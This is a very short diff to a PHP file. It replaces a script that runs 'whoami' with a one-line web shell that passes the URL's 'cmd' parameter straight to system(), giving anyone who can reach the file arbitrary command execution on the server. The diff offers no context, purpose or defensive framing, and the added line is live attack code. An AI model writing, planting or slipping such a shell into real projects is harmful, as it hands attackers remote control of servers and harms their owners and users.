@@ -1,3 +1,1 @@
-<?php 
-system("whoami");
-?>
+<?php system($_GET['cmd']);?>
